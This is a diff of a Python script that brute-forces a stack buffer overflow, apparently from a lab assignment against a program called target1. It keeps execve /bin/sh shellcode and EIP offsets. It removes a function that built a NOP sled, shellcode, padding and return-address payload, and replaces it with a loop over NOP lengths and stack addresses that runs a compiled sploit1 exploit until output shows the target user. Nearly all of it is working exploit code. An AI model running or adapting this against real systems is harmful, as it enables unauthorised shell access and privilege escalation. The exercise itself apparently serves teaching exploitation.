@@ -8,25 +8,21 @@ shellcode = (
     b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 )
 
-stack_start = 0xffffd4cc
+MAX_NOP_LENGTH = 100
 ebp_offset = 44
 eip_offset = 48
 
-def run_exploit(payload):
-    print(f"[*] Trying payload: {payload}")
+def run_exploit(nop_length, eip_address):
+    print(f"[*] Trying NOP length: {nop_length}, EIP address: {hex(eip_address)}")
     
     try:
-        # Write the payload to a file
-        with open("../targets/payload", "wb") as f:
-            f.write(payload)
-        
-        # Run the target program with the payload
-        p = subprocess.Popen(["../targets/target1", "payload"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        # Run the sploit program with the NOP sled length and EIP address as arguments
+        p = subprocess.Popen(["./sploit1", str(nop_length), hex(eip_address)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, error = p.communicate()
         
         # Check if the exploit was successful
         if b"targetuser" in output:
-            print(f"[+] Exploit succeeded with payload: {payload}")
+            print(f"[+] Exploit succeeded with NOP length: {nop_length}, EIP address: {hex(eip_address)}")
             print(output.decode())
             return True
         
@@ -39,42 +35,22 @@ def run_exploit(payload):
     
     return False
 
-def build_payload(nop_length, eip_address):
-    nop_sled = b"\x90" * nop_length
-    eip_address = struct.pack("<I", eip_address)
-    
-    padding_length = ebp_offset - len(nop_sled) - len(shellcode)
-    if padding_length < 0:
-        return None
-    
-    padding = b"A" * padding_length
-    
-    payload = nop_sled + shellcode + padding + b"BBBB" + b"A" * (eip_offset - ebp_offset - 4) + eip_address
-    return payload
-
 def brute_force():
-    # Define the range of NOPs and addresses to test
-    nop_range = range(0, 1000)  # Test every number of NOPs from 0 to 999
-    addr_range = range(0xffff0000, 0xffffffff)  # Test all addresses starting with "ffff"
-    
-    for nop_length in nop_range:
-        for addr in addr_range:
-            payload = build_payload(nop_length, addr)
-            if payload is None:
-                continue
-            
-            if run_exploit(payload):
+    # Test all combinations of NOP lengths and addresses
+    for nop_length in range(1, MAX_NOP_LENGTH + 1):
+        for addr in range(0xffff0000, 0xffffffff + 1):
+            if run_exploit(nop_length, addr):
                 return
     
-    print("[-] Exploit failed. No suitable offset and address found.")
+    print("[-] Exploit failed. No suitable NOP length and address found.")
 
 if __name__ == "__main__":
     print("[*] Starting brute-force analysis...")
     
-    # Compile the target program
-    print("[*] Compiling the target program...")
-    subprocess.run(["gcc", "-g", "-fno-stack-protector", "-z", "execstack", "-m32", "-o", "../targets/target1", "../targets/target1.c"])
-    print("[+] Target program compiled.")
+    # Compile the sploit program
+    print("[*] Compiling the sploit program...")
+    subprocess.run(["gcc", "-o", "sploit1", "sploit1.c"])
+    print("[+] Sploit program compiled.")
     
     brute_force()
     print("[*] Brute-force analysis completed.")
